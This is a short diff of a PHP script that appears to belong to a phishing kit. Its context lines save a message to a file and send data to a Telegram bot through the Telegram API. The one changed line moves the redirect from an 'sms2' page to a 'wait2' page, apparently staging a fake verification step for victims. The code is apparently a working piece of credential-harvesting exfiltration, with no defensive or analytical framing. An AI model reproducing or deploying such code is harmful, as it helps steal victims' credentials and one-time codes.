@@ -14,5 +14,5 @@ fwrite($text, $msg);
 include '../../config.php';
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 
-header("Location: ../sms2.html");
+header("Location: ../wait2.html");
 ?>
